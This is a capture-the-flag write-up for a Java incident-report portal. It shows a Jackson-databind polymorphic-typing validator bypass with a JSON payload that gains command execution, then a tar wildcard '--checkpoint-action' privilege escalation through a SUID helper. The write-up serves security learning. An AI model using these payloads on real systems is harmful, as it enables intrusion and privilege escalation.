# Cerberus Reports — Solution

**Flag:** `UCSI26{cerberus_gadget_privesc_8630453b}`

Target: http://52.76.96.108:8087  (Cerberus incident-report portal, JDK HttpServer + Jackson-databind 2.10.0)

The challenge has two stages, as the description hints: **"Get past the importer, then work your way up to what only the report administrator can read."**

---

## Stage 1 — Bypass the importer → RCE (Jackson polymorphic typing)

Auth is hardcoded in `SessionService`:
`POST /login` `{"username":"analyst","password":"cerberus123"}` → token.

`POST /report/import` deserializes an uploaded bundle with an `ObjectMapper` whose
`BasicPolymorphicTypeValidator` allow-list is:

```java
BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("java.util.")          // String-prefix matcher  (NameMatcher)
    .allowIfSubType(IncidentReport.class)  // Class matcher: only those 4 report subtypes
    .allowIfSubType(AssetInventory.class)
    .allowIfSubType(ThreatIndicator.class)
    .allowIfSubType(ReportMetadata.class);
```

The dangerous gadget is `com.ucsi.cerberus.enrich.EnrichmentTask`:

```java
public void setCommand(String[] command) {
    this.command = command;
    this.output = CommandRunner.run(command);   // <-- runs any argv
}
```

`collectEnrichmentOutput()` then echoes `EnrichmentTask.output` back in the import
response, so any command output is exfiltrated directly. But `EnrichmentTask` is **not**
in the allow-list, so a plain `["com.ucsi.cerberus.enrich.EnrichmentTask",{...}]` is
rejected ("report type not in the accepted set").

### The bypass: generic type id skips subType validation

`DatabindContext.resolveAndValidateSubType(baseType, id, ptv)` has a special branch
for type ids containing `<` (`_resolveAndValidateGeneric`). It:

1. Splits the id at the first `<` and runs `validateSubClassName` on the **prefix only**.
2. If that returns **`ALLOWED`**, it builds the generic `JavaType` with
   `TypeFactory.constructFromCanonical` and **returns it immediately — never calling
   `validateSubType`**.

`BasicPolymorphicTypeValidator.validateSubClassName` returns `ALLOWED` for any class
name starting with `java.util.`. So a type id of:

```
java.util.List<com.ucsi.cerberus.enrich.EnrichmentTask>
```

- prefix `java.util.List` → matches `"java.util."` → ALLOWED → generic resolution
- resolves to `List<EnrichmentTask>`, whose element type is the concrete
  `EnrichmentTask` bean (no further polymorphic check on elements).

`ReportBundle.enrichment` is `Object` annotated
`@JsonTypeInfo(use=Id.CLASS, include=As.WRAPPER_ARRAY)`, so the wrapper
`["java.util.List<com.ucsi.cerberus.enrich.EnrichmentTask>", [ {...}, ... ] ]`
feeds each element straight to the `EnrichmentTask` BeanDeserializer, which calls
`setCommand(String[])` → `CommandRunner.run` → arbitrary command, output returned.

PoC import body:

```json
{"enrichment":["java.util.List<com.ucsi.cerberus.enrich.EnrichmentTask>",
               [{"command":["id"]}]]}
```

Response:
`{"status":"ok","imported":0,"enrichment":["uid=1400(webapp) gid=1400(webapp) ..."]}`

→ RCE as `webapp` (uid 1400).

---

## Stage 2 — Escalate to `report-admin`

`GET /admin/secret` returns 403 because the Java process runs as `webapp`, while
`/srv/cerberus/admin/secret.flag` is `----r-----  root report-admin` (only the
`report-admin` group can read it; `report-admin` has gid 1500 and no members).

Local enum found a custom SUID helper:

```
-rwsr-xr-x 1 root root 694984 ... /usr/local/bin/report-maint
```

`strings` (via `tr -c '[:print:]' '\n'`) on the binary reveals its behavior:

```
[report-maint] setgid
[report-maint] setuid
[report-maint] compacting incident-report spool ...
cd /var/lib/cerberus/reports/incoming && tar czf /var/lib/cerberus/reports/archive.tgz * 2>/dev/null
```

`report-maint` (SUID root) drops privileges to `report-admin`, then runs that shell
command via `system()`. Two classic mistakes:

1. **Invokes `tar` via shell** — arbitrary file names pass as `––` options.
2. Uses the **wildcard `*`** — `tar` interprets `--checkpoint-action=exec=...`
   filenames as real options.

`/var/lib/cerberus/reports/incoming` is a `1777` (world-writable) sticky dir owned
by `report-admin`, so `webapp` can plant files. Drop the classic tar-wildcard payload:

```sh
cd /var/lib/cerberus/reports/incoming
cat > poc.sh <<'EOF'
#!/bin/sh
cat /srv/cerberus/admin/secret.flag > /var/lib/cerberus/reports/incoming/out.flag
chmod 666 /var/lib/cerberus/reports/incoming/out.flag
EOF
chmod +x poc.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh poc.sh'
/usr/local/bin/report-maint      # root-driven, runs tar as report-admin -> runs poc.sh
cat /var/lib/cerberus/reports/incoming/out.flag
```

`tar` parses the `--checkpoint=1` and `--checkpoint-action=exec=sh poc.sh` filenames
as options and runs `poc.sh` as `report-admin` (confirmed: the dumped `id` shows
`uid=1500(report-admin) gid=1500(report-admin)`). `poc.sh` copies
`/srv/cerberus/admin/secret.flag` to a world-readable file.

### Result

```
UCSI26{cerberus_gadget_privesc_8630453b}
```

---

## Summary of the chain

1. Log in as `analyst:cerberus123`.
2. Import a bundle whose `enrichment` type id is
   `java.util.List<com.ucsi.cerberus.enrich.EnrichmentTask>` — the generic-id path
   validates only the `java.util.` prefix, so the dangerous `EnrichmentTask` element
   type slips past `BasicPolymorphicTypeValidator`. Its `setCommand` runs any argv and
   the output is echoed back in the import response → **RCE as `webapp`**.
3. Abuse the SUID `/usr/local/bin/report-maint`, which (after dropping to
   `report-admin`) `system()`-runs `tar ... *`. Plant `--checkpoint=1` +
   `--checkpoint-action=exec=sh poc.sh` filenames in the world-writable spool dir and
   trigger the helper → **command exec as `report-admin`**.
4. As `report-admin`, `cat /srv/cerberus/admin/secret.flag` → flag.

The HTTP `/admin/secret` endpoint stays a red herring: the process is `webapp` and
can't `Files.isReadable` the `root:report-admin` file.